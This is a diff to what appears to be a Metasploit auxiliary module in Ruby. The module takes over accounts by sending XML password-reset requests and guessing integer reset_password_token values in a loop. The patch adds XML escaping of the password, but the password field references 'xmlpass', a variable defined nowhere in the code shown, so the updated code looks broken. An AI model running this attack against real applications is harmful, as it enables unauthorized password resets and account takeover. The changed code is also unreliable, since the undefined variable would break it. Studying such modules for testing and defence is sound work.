@@ -6,6 +6,7 @@
 ##
 
 require 'msf/core'
+require 'rexml/element'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -80,13 +81,15 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def reset_one(password, report=false)
-		print_status("Resetting password to \"#{datastore['PASSWORD']}\"") if report
+		print_status("Resetting password to \"#{password}\"") if report
 
 		(0..datastore['MAXINT']).each{ |int_to_try|
+			encode_pass = REXML::Text.new(password).to_s
+
 			xml = ""
 			xml << "<user>"
-			xml << "<password>#{password}</password>"
-			xml << "<password_confirmation>#{password}</password_confirmation>"
+			xml << "<password>#{xmlpass}</password>"
+			xml << "<password_confirmation>#{encode_pass}</password_confirmation>"
 			xml << "<reset_password_token type=\"integer\">#{int_to_try}</reset_password_token>"
 			xml << "</user>"
 
